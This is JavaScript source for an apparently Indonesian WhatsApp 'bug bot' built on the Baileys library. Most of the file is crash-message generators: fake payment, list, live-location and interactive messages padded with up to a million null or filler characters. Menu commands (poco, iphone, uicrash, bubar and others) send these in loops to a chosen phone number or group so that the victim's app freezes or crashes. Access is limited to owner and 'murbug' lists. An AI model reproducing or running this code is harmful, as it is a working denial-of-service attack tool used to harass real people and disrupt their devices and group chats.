//BASE BY RXHL
//CREATOR : ARAFI ABC

//KAMI SENANG JIKALAU KALIAN TIDAK MENGHAPUS CREDIT DI ATAS
//JIKALAU MAU REUPLOAD JAN DI HAPUS TAMBAHI AJA🙂

require('./settings')
require('./lib/language')
require('./lib/virtex/virus')
const { WA_DEFAULT_EPHEMERAL, getAggregateVotesInPollMessage, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, downloadContentFromMessage, areJidsSameUser, getContentType, useMultiFileAuthState, makeWASocket, fetchLatestBaileysVersion, makeCacheableSignalKeyStore, makeWaSocket } = global.baileys1
const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const os = require('os')
const axios = require('axios')
const fsx = require('fs-extra')
const crypto = require('crypto')
const ffmpeg = require('fluent-ffmpeg')
const speed = require('performance-now')
const { beta1, beta2, buk1 } = require("./lib/hdr.js")
const bugres = 'PROSES MENGIRIM PAKET'
const bugsuc = '『 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 𝐌𝐄𝐋𝐀𝐊𝐒𝐀𝐍𝐀𝐊𝐀𝐍』\n\n𝙰𝙱𝙲\n\n  𝙽𝚘𝚝𝚎\n> Jika target masih c2 biarin aja nanti juga c1'
// VIRTEX 
		const {
			ios
		} = require("./lib/virtex/ios.js")
		const {
			freeze
		} = require("./lib/virtex/freeze.js")
		const {
			convite
		} = require("./lib/virtex/convite.js")
		const {
			bugpdf
		} = require("./lib/virtex/bugpdf.js")
		const {
			bugurl
		} = require('./lib/virtex/bugUrl.js')
		const {
		    talapreta3
	    } = require('./lib/virtex/telapreta3.js')
const timestampp = speed();
const latensi = speed() - timestampp
const moment = require('moment-timezone')
const { smsg, tanggal, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins, generateProfilePicture } = require('./lib/storage')
const { JSDOM } = require('jsdom')
module.exports = rxhl = async (rxhl, m, chatUpdate, store) => {
try {
var body = (m.mtype === 'conversation') ? m.message.conversation: (m.mtype == 'imageMessage') ? m.message.imageMessage.caption: (m.mtype == 'videoMessage') ? m.message.videoMessage.caption: (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text: (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId: (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId: (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId: (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text): ''
var budy = (typeof m.text == 'string' ? m.text: '')
var prefix = global.prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : global.prefa ?? global.prefix
const owner = JSON.parse(fs.readFileSync('./lib/owner.json'))
const murbug = JSON.parse(fs.readFileSync('./lib/murbug.json'))
const isCmd = body.startsWith(prefix)
const command = body.startsWith(prefix) ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase(): ''
const args = body.trim().split(/ +/).slice(1)
const botNumber = await rxhl.decodeJid(rxhl.user.id)
const isCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isMurbug = [botNumber, ...murbug].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const qtext = q = args.join(" ")
const quoted = m.quoted ? m.quoted : m
const from = mek.key.remoteJid
const { spawn: spawn, exec } = require('child_process')
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const groupMetadata = m.isGroup ? await rxhl.groupMetadata(from).catch(e => {}) : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const pushname = m.pushName || "No Name"
const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
const rxhlimage = fs.readFileSync('./lib/image/rxhl.jpg')
const mime = (quoted.msg || quoted).mimetype || ''
const { uptotelegra } = require('./lib/upload')
const { TelegraPh, UploadFileUgu, webp2mp4File, floNime } = require('./lib/uploader')
const virgam = fs.readFileSync('./lib/virtex/virgam.jpeg')
const slayer07 = fs.readFileSync('./lib/image/slayer07.jpg')
const ytdl = require("ytdl-core")
const bugthumb = fs.readFileSync ('./lib/image/mamak.jpg')
const { startbot, stopjadibot } = require('./lib/start')
const responbug = '𝐓𝐔𝐍𝐆𝐆𝐔 𝐒𝐀𝐌𝐏𝐀𝐈 𝐁𝐎𝐓 𝐁𝐈𝐋𝐀𝐍𝐆 𝐒𝐄𝐋𝐄𝐒𝐀𝐈'


// Hahahaha
if (!rxhl.public) {
if (!isCreator) return
}

if (command) {
console.log("");
console.log(chalk.white(chalk.bgHex('#4a69bd').bold(`🚀 WhatsApp messages! 🚀`)));
console.log(chalk.black(chalk.bgHex('#fdcb6e')(`📅 DATE: ${time}
💬 MESSAGE: ${command}
🗣️ SENDERNAME: ${pushname}
👤 JIDS: ${m.sender}`)));
}

let rn = ['recording']
let jd = rn[Math.floor(Math.random() * rn.length)];
if (m.message) {
rxhl.sendPresenceUpdate(jd, from)
}

async function loading () {
var rxhlloading = [
" 𝗔𝗿𝗮𝗳𝗶",
" 𝗔𝗯𝗰",
" 𝗩𝟭",
" 🗿💨💨"
]
let { key } = await rxhl.sendMessage(from, {text: 'ʟᴏᴀᴅɪɴɢ...'})
for (let i = 0; i < rxhlloading.length; i++) {
await rxhl.sendMessage(from, {text: rxhlloading[i], edit: key });
}
}

// Function Penting

const FileSize = (number) => {
var SI_POSTFIXES = ["B", " KB", " MB", " GB", " TB", " PB", " EB"]
var tier = Math.log10(Math.abs(number)) / 3 | 0
if(tier == 0) return number
var postfix = SI_POSTFIXES[tier]
var scale = Math.pow(10, tier * 3)
var scaled = number / scale
var formatted = scaled.toFixed(1) + ''
if (/\.0$/.test(formatted))
formatted = formatted.substr(0, formatted.length - 2)
return formatted + postfix
}

rxhl.sendButton = async (jid, buttons, quoted, opts = {}) => {
      let message = generateWAMessageFromContent(jid, {
         viewOnceMessage: {
            message: {
               interactiveMessage: {
                  body: {
                     text: opts && opts.body ? opts.body : ''
                  },
                  footer: {
                     text: opts && opts.footer ? opts.footer : ''
                  },
                  nativeFlowMessage: {
                     buttons: buttons,
                     messageParamsJson: ''
                  }
               }
            }
         }
      }, {
         quoted
      })
      await rxhl.sendPresenceUpdate('composing', jid)
      return rxhl.relayMessage(jid, message["message"], {
         messageId: message.key.id
      })
   }
   

// batas
const reply = (teks) => {

            rxhl.sendMessage(m.chat,

{

    text: teks,

    contextInfo: {

        mentionedJid: [sender],

        forwardingScore: 9999999,

        isForwarded: true,

        "externalAdReply": {

            "showAdAttribution": true,

            "containsAutoReply": true,

            "title": `ArafiAbc`,



            "previewType": "PHOTO",

            "thumbnailUrl": ``,

            "thumbnail": fs.readFileSync(`./lib/image/rxhl.jpg`),


        }

    }

},

{ quoted: m })

        }

// Function Bug

const force = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": rxhlimage
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"Arafi ✅",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}

const bugquoteddvc = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
listResponseMessage: {
title: `RxhlOfc`
}
}
}

async function ngeloc(target, kuwoted) {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `RXHL BUG WHATSAPP ✅`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: kuwoted })
await rxhl.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}

async function sendViewOnceMessages(jid) {
    let messageContent = generateWAMessageFromContent(jid, {
      'viewOnceMessage': {
        'message': {
          'messageContextInfo': {
            'deviceListMetadata': {},
            'deviceListMetadataVersion': 2
          },
          'interactiveMessage': proto.Message.InteractiveMessage.create({
            'body': proto.Message.InteractiveMessage.Body.create({
              'text': ''
            }),
            'footer': proto.Message.InteractiveMessage.Footer.create({
              'text': ''
            }),
            'header': proto.Message.InteractiveMessage.Header.create({
              'title': '',
              'subtitle': '',
              'hasMediaAttachment': false
            }),
            'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
              'buttons': [{
                'name': "cta_url",
                'buttonParamsJson': "{\"display_text\":\"à¾§\".repeat(50000),\"url\":\"https://www.google.com\",\"merchant_url\":\"https://www.google.com\"}"
              }],
              'messageParamsJson': "\0".repeat(100000)
            })
          })
        }
      }
    }, {});
    rxhl.relayMessage(jid, messageContent.message, {
      'messageId': messageContent.key.id
    });
}

async function pirgam(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    interactiveMessage: {
      header: {
        title: "RxhlCrash",
        hasMediaAttachment: true,
        ...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/52fbfcc0fd22e01c0ab3f.jpg" } }, { upload: rxhl.waUploadToServer }))
      },
      body: {
        text: ""
      },
      footer: {
        text: "›          #ArafiAbc"
      },
      nativeFlowMessage: {
        messageParamsJson: " ".repeat(1000000)
      }
    }
}), { userJid: target, quoted: kuwoted });
await rxhl.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

async function penghitaman(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "stickerMessage": {
    "url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
    "fileSha256": "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
    "fileEncSha256": "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
    "mediaKey": "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
    "mimetype": "image/webp",
    "directPath": "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
    "fileLength": "10116",
    "mediaKeyTimestamp": "1715876003",
    "isAnimated": false,
    "stickerSentTs": "1715881084144",
    "isAvatar": false,
    "isAiSticker": false,
    "isLottie": false
  }
}), { userJid: target, quoted: kuwoted });
await rxhl.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}


async function sendListMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'listMessage': {
      'title': "ARAFI ABC" + "\0".repeat(920000),
      'footerText': "àº®â‚®à½žà¸¨Vê™°à¸¨ à¹–àº¡Gê™°à½€Í¡Íœâœ…âƒŸâ•®",
      'description': "àº®â‚®à½žà¸¨Vê™°à¸¨ à¹–àº¡Gê™°à½€Í¡Íœâœ…âƒŸâ•®",
      'buttonText': null,
      'listType': 2,
      'productListInfo': {
        'productSections': [{
          'title': "lol",
          'products': [{
            'productId': "4392524570816732"
          }]
        }],
        'productListHeaderImage': {
          'productId': "4392524570816732",
          'jpegThumbnail': null
        },
        'businessOwnerJid': "0@s.whatsapp.net"
      }
    },
    'footer': "lol",
    'contextInfo': {
      'expiration': 600000,
      'ephemeralSettingTimestamp': "1679959486",
      'entryPointConversionSource': "global_search_new_chat",
      'entryPointConversionApp': "whatsapp",
      'entryPointConversionDelaySeconds': 9,
      'disappearingMode': {
        'initiator': "INITIATED_BY_ME"
      }
    },
    'selectListType': 2,
    'product_header_info': {
      'product_header_info_id': 292928282928,
      'product_header_is_rejected': false
    }
  }), {
    'userJid': jid
  });
  
  await rxhl.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}

async function sendSystemCrashMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'interactiveMessage': {
          'header': {
            'title': '',
            'subtitle': " "
          },
          'body': {
            'text': "𝐀𝐑𝐀𝐅𝐈 𝐀𝐁𝐂"
          },
          'footer': {
            'text': 'xp'
          },
          'nativeFlowMessage': {
            'buttons': [{
              'name': 'cta_url',
              'buttonParamsJson': "{ display_text : 'ARAFI ABC WHATSAPP', url : , merchant_url :  }"
            }],
            'messageParamsJson': "\0".repeat(1000000)
          }
        }
      }
    }
  }), {
    'userJid': jid
  });
  await rxhl.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}
const wanted = {
            key: {
                remoteJid: 'p',
                fromMe: false,
                participant: '0@s.whatsapp.net'
            },
            message: {
                "interactiveResponseMessage": {
                    "body": {
                        "text": "Sent",
                        "format": "DEFAULT"
                    },
                    "nativeFlowResponseMessage": {
                        "name": "galaxy_message",
                        "paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"ZetExecute\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"czazxvoid@abc.id\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0003".repeat(500000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                        "version": 3
                    }
                }
            }
        }
        
async function sendLiveLocationMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'liveLocationMessage': {
          'degreesLatitude': 'p',
          'degreesLongitude': 'p',
          'caption': 'Ø‚Ù†ØƒØ„Ù½Ø‚Ù†ØƒØ„Ù½'+"ꦾ".repeat(50000),
          'sequenceNumber': '0',
          'jpegThumbnail': ''
        }
      }
    }
  }), {
    'userJid': jid
  });
  
  await rxhl.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}



async function sendVariousMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    sendListMessage(jid);
    await sleep(1500)
    sendLiveLocationMessage(jid);
    await sleep(2000)
    sendSystemCrashMessage(jid);
    await sleep(500);
    sendSystemCrashMessage(jid);
    await sleep(500);
  }
}

async function sendRepeatedMessages2(jid, count) {
  for (let i = 0; i < count; i++) {
    sendSystemCrashMessage(jid);
    await sleep(1500)
    sendSystemCrashMessage(jid);
    await sleep(2000)
    sendSystemCrashMessage(jid);
    await sleep(500);
    sendSystemCrashMessage(jid);
    await sleep(500);
  }
}

const xbug2 = {
key: {
remoteJid: 'status@broadcast',
fromMe: false, 
participant: '0@s.whatsapp.net'
},
message: {
listResponseMessage: {
title: `ArafAbc`
}
}
}

async function iponcrash(target) {
await rxhl.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
sleep(200)
await rxhl.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
sleep(200)
await rxhl.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
}

async function bughomebutton(jid) {
var etc = generateWAMessageFromContent(jid, proto.Message.fromObject({ viewOnceMessage: {
message: {
  "interactiveMessage": {
    "header": {
      "title": "",
      "subtitle": " "
    },
    "body": {
      "text": "IYA IN"
    },
    "footer": {
      "text": "›ArafiBotz"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : 'ArafiBugWhatsApp', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(1000000)
    }
  }
}
}
}), { userJid: jid, quoted: m })
await rxhl.relayMessage(jid, etc.message, { messageId: etc.key.id })
}

async function sendBugIos(jid) {
iponcrash(jid)
sleep(500)
sendExtendedTextMessage(jid)
}

// Batas
async function sendQP(target, filterName, parameters, filterResult, clientNotSupportedConfig, clauseType, clauses, filters) {
    var qpMessage = generateWAMessageFromContent(target, proto.Message.fromObject({
        'qp': {
            'filter': {
                'filterName': filterName,
                'parameters': parameters,
                'filterResult': filterResult,
                'clientNotSupportedConfig': clientNotSupportedConfig
            },
            'filterClause': {
                'clauseType': clauseType,
                'clauses': clauses,
                'filters': filters
            }
        }
    }), { userJid: target });

    await rxhl.relayMessage(target, qpMessage.message, { participant: { jid: target }, messageId: qpMessage.key.id });
}


const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}

const replyy = (teks) => {
return rxhl.sendMessage(from, { text: teks, contextInfo:{"externalAdReply": {"title": `RXHL DEVELOPER 🌛`,"body": `Hai ${pushname}`, "previewType": "PHOTO","thumbnail": rxhlimage,"sourceUrl": `https://youtube.com/@rxhlofc`}}}, { quoted:m})} 

const replyz = (teks) => { 
rxhl.sendMessage(from, { text: teks, kuti: { 
"externalAdReply": { 
"showAdAttribution": true, 
"title": "ARAFI ABC", 
"containsAutoReply": true, 
"mediaType": 1,
"sourceUrl": "https://whatsapp.com/channel/0029ValElaQ7dmeUkOsDPg25" }}}, { quoted: m }) }
async function sendSessionStructure(target, sessionVersion, localIdentityPublic, remoteIdentityPublic, rootKey, previousCounter, senderChain, receiverChains, pendingKeyExchange, pendingPreKey, remoteRegistrationId, localRegistrationId, needsRefresh, aliceBaseKey) {
    var sessionStructure = generateWAMessageFromContent(target, proto.Message.fromObject({
        'sessionStructure': {
            'sessionVersion': sessionVersion,
            'localIdentityPublic': localIdentityPublic,
            'remoteIdentityPublic': remoteIdentityPublic,
            'rootKey': rootKey,
            'previousCounter': previousCounter,
            'senderChain': senderChain,
            'receiverChains': receiverChains,
            'pendingKeyExchange': pendingKeyExchange,
            'pendingPreKey': pendingPreKey,
            'remoteRegistrationId': remoteRegistrationId,
            'localRegistrationId': localRegistrationId,
            'needsRefresh': needsRefresh,
            'aliceBaseKey': aliceBaseKey
        }
    }), { userJid: target });

    await rxhl.relayMessage(target, sessionStructure.message, { participant: { jid: target }, messageId: sessionStructure.key.id });
}
// Komen
switch(command) {
// MENU
case 'menu':
await loading()
const messagemenu = `▭▬▭▬▭▬▭▬▭▬▭▬▭▬
     ཌ𝗕𝗼𝘁 𝗔𝗯𝗰 𝗩𝟭ད
༒ 𝗖𝗥𝗘𝗔𝗧𝗢𝗥 : 𝗔𝗿𝗮𝗳𝗶𝗔𝗯𝗰
༒ 𝗕𝗔𝗦𝗘 : 𝗥𝗫𝗛𝗟
༒ 𝗧𝗬𝗣𝗘 : 𝗖𝗔𝗦𝗘
༒ 𝗠𝗢𝗗𝗘 : Public
༒ 𝗣𝗥𝗘𝗙𝗜𝗫 : 𝗠𝗨𝗟𝗧𝗜
▭▬▭▬▭▬▭▬▭▬▭▬▭▬ 
     *BOT FITUR* 
༒ self
༒ public
༒ setppbot
༒ controlmenu
 ▭▬▭▬▭▬▭▬▭▬▭▬▭▬
࿌ 𝗗𝗔𝗙𝗧𝗔𝗥 𝗠𝗘𝗡𝗨 𝗕𝗨𝗚 ࿌
    ࿈࿈࿈࿈࿈࿈࿈࿈࿈࿈
  ࿃ 𝗕𝗨𝗚 𝗗𝗘𝗩𝗜𝗖𝗘 ࿃
   
༒ poco *+628xxx*
༒ samsung *+628xxx*
༒ vivo *+628xxx*
༒ all-device *+628xxx*

   ࿃ 𝗕𝗨𝗚 𝗜𝗣𝗛𝗢𝗡𝗘 ࿃
༒  iphone *+62xxx*
༒  xios *+628xxx*
༒  xip *+628xxx*

   ࿃ 𝗕𝗨𝗚 𝗖𝗥𝗔𝗦𝗛 𝗨𝗜 ࿃
༒ uisystem *+628xxx*
༒ uicrash *+628xxx*
༒ trash-loc *+628xxx*

   ࿃ 𝗕𝗨𝗚 𝗚𝗥𝗢𝗨𝗣 ࿃
༒ basmi-group  *Id Grup*
༒ getidgrup *Link Gc*
༒ bubar *Id Grup*

࿃ 𝗕𝗨𝗚  𝗘𝗠𝗢𝗝𝗜 ࿃
😀 62xx|5
🤮 62xx|5
🔥 62xx|5
🌷 62xx|5
😒 62xx|5
🤡 62xx|5
▭▬▭▬▭▬▭▬▭▬▭▬▭▬`
const imageUrl ='https://img100.pixhost.to/images/29/531935642_verlangdev.jpg'
await rxhl.sendMessage(from, { image: { url: imageUrl }, caption: messagemenu }, { quoted: m
});

    break
// CONTROL MENU
case 'controlmenu':
    await loading()
    if (!isCreator) return replyz(global.nocreator)
    const messageControlMenu = `࿅࿅࿅࿅࿅࿅࿅࿅࿅࿅࿅࿅࿅࿅࿅࿅࿅࿅࿅࿅࿅࿅࿅࿅
      ࿈࿈࿈࿈࿈࿈࿈࿈࿈
   𝐂⃟𝐎𝐍𝐓𝐑𝐎𝐋 𝐌𝐄𝐍𝐔   
•. ${prefix}self 
•. ${prefix}public 
•. ${prefix}setppbot
•. ${prefix}setppbot /full
࿅࿅࿅࿅࿅࿅࿅࿅࿅࿅࿅࿅࿅࿅࿅࿅࿅࿅࿅࿅࿅࿅࿅࿅
      ࿈࿈࿈࿈࿈࿈࿈࿈࿈
   *༒𝗙𝗜𝗧𝗨𝗥 𝗔𝗞𝗦𝗘𝗦༒* 
•. ${prefix}addowner 62xxx
•. ${prefix}dellowner 62xxx
•. ${prefix}addmurbug 62xxx
•. ${prefix}dellmurbug 62xxx
•. ${prefix}listuser
࿅࿅࿅࿅࿅࿅࿅࿅࿅࿅࿅࿅࿅࿅࿅࿅࿅࿅࿅࿅࿅࿅࿅࿅`
rxhl.sendMessage(from, { text: messageControlMenu }, { quoted: m

})

break

// CASE LAINNYA
case 'addowner':
if (!isCreator) return replyz(global.nocreator)
if (!args[0]) return replyz(`Use ${prefix+command} Number\nExample ${prefix+command} 62xxxxx`)
bnnd = qtext.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await rxhl.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (ceknye.length == 0) return replyz(`Enter a valid number and register on WhatsApp!!!`)
owner.push(bnnd)
murbug.push(bnnd)
fs.writeFileSync('./lib/owner.json', JSON.stringify(owner))
fs.writeFileSync('./lib/murbug.json', JSON.stringify(murbug))
replyz(`Number ${bnnd} Has Been Added to Premium!!!`)
break

case 'inspect': case 'getidgrup': {
if (!isMurbug) return replyz(global.nocreator)
if (!qtext) return replyz('Link?')
let linkRegex = args.join(" ")
let coded = linkRegex.split("https://chat.whatsapp.com/")[1]
if (!coded) return replyz("Link Invalid")
rxhl.query({
tag: "iq",
attrs: {
type: "get",
xmlns: "w:g2",
to: "@g.us"
},
content: [{ tag: "invite", attrs: { code: coded } }]
}).then(async(res) => { 
tekse = `${res.content[0].attrs.id ? res.content[0].attrs.id : "undefined"}`
replyz(tekse)
})}
break

case 'dellowner':
if (!isCreator) return replyz(global.nocreator)
if (!args[0]) return replyz(`Use ${prefix+command} Number\nExample ${prefix+command} 62xxxxx`)
yaki = qtext.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(yaki)
anp = murbug.indexOf(yaki)
owner.splice(unp, 1)
murbug.splice(anp, 1)
fs.writeFileSync('./lib/owner.json', JSON.stringify(owner))
fs.writeFileSync('./lib/murbug.json', JSON.stringify(murbug))
replyz(`Number ${yaki} Has Been Removed From Premium!!!`)
break

case 'addmurbug':
if (!isCreator) return replyz(global.nocreator)
if (!args[0]) return replyz(`Use ${prefix+command} Number\nExample ${prefix+command} 62xxxxx`)
bnnd = qtext.split("|")[0].replace(/[^0-9]/g, '')
let cekkanbre = await rxhl.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (cekkanbre.length == 0) return replyz(`Enter a valid number and register on WhatsApp!!!`)
murbug.push(bnnd)
fs.writeFileSync('./lib/murbug.json', JSON.stringify(murbug))
replyz(`Number ${bnnd} Has Been Added to Murbug!!!`)
break

case 'dellmurbug':
if (!isCreator) return replyz(global.nocreator)
if (!args[0]) return replyz(`Use ${prefix+command} Number\nExample ${prefix+command} 62xxxxx`)
yaki = qtext.split("|")[0].replace(/[^0-9]/g, '')
unp = murbug.indexOf(yaki)
murbug.splice(unp, 1)
fs.writeFileSync('./lib/murbug.json', JSON.stringify(murbug))
replyz(`Number ${yaki} Has Been Removed From Murbug!!!`)
break

case 'hidetag': {
if (!isCreator) return replyz(global.nocreator)
if (!m.isGroup) return replyz(global.noingroup)
await loading()
rxhl.sendMessage(from, { text : q ? q : '' , mentions: participants.map(a => a.id)}, {quoted:m})
}
break


case 'public': {
if (!isCreator) return replyz(global.nocreator)
rxhl.public = true
replyz('Sukse Change To Public')
}
break

case 'self': {
if (!isCreator) return replyz(global.nocreator)
rxhl.public = false
replyz('Sukse Mode Untuk Owner Pribadi')
}
break


case 'poco': case 'xvrezx': case 'xvzzar': 
if (!isMurbug) return replyz(global.nocreator)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 30; i++) {
await beta2(rxhl, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(rxhl, target, wanted)
}
reply(`『 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 𝗠𝗘𝗟𝗔𝗞𝗦𝗔𝗡𝗔𝗞𝗔𝗡 』

㇋𝗔𝗿𝗮𝗳𝗶𝗔𝗯𝗰👾

𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
𝐓𝐘𝐏𝐄 𝐁𝐔𝐆 : ${command}`)
break
case 'yts': case 'ytsearch': {
if (!q) return replyz(`Example : ${prefix + command} story wa anime`)
yts = require("yt-search")
search = await yts(q)
nyaabanaayts = 'YouTube Search\n\n Result From '+q+'\n\n'
no = 1
for (let i of search.all) {
hasilpencarian = `${nyaabanaayts}\nNo : ${no++}\n Type : ${i.type}\n Video ID : ${i.videoId}\n Title : ${i.title}\n Views : ${i.views}\n Duration : ${i.timestamp}\n Uploaded : ${i.ago}\n Url : ${i.url}\n\n─────────────────\n\n`
}
rxhl.sendMessage(from, { image: { url: search.all[0].thumbnail },  caption: hasilpencarian }, { quoted: m })
}
break

case 'setppbot': case 'setbotpp': {
if (!isCreator) return replyz(global.nocreator)
if (!quoted) return replyz(`Send/Reply Image With Caption ${prefix + command}`)
if (!/image/.test(mime)) return replyz(`Send/Reply Image With Caption ${prefix + command}`)
if (/webp/.test(mime)) return replyz(`Send/Reply Image With Caption ${prefix + command}`)
var medis = await rxhl.downloadAndSaveMediaMessage(quoted)
if (args[0] == `/full`) {
var { img } = await generateProfilePicture(medis)
await rxhl.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(medis)
replyz(`Success`)
} else {
var memeg = await rxhl.updateProfilePicture(botNumber, { url: medis })
fs.unlinkSync(medis)
replyz(`Success`)
}
}
break

case 'nowa': {
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz(`insert Number, example: ${prefix+command} 62853388888xxx`)
var noteks = args[0]
if (!noteks.includes('x')) return replyz('Enter the suffix x to find the number?')
function countInstances(string, word) {
return string.split(word).length - 1;
}
var nomer0 = noteks.split('x')[0]
var nomer1 = noteks.split('x')[countInstances(noteks, 'x')] ? noteks.split('x')[countInstances(noteks, 'x')]: ''
var random_length = countInstances(noteks, 'x')
if (random_length > 4) {
  return replyz('Maaf, hanya bisa mencari nomor dengan maksimal 4 x')
}
var random;
replyz('Loading')
if (random_length == 1) {
  random = 10
} else if (random_length == 2) {
  random = 100
} else if (random_length == 3) {
  random = 1000
} else if (random_length == 4) {
  random = 10000
}
var nomerny = `Have a bio\n`
var no_bio = `\nWithout Bio / Default bio.\n`
var no_watsap = `\nNot registered on whatsapp\n`
var data = {}
for (let i = 0; i < random; i++) {
  var nu = ['1','2','3','4','5','6','7','8','9']
  var t1 = nu[Math.floor(Math.random() * nu.length)]
  var t2 = nu[Math.floor(Math.random() * nu.length)]
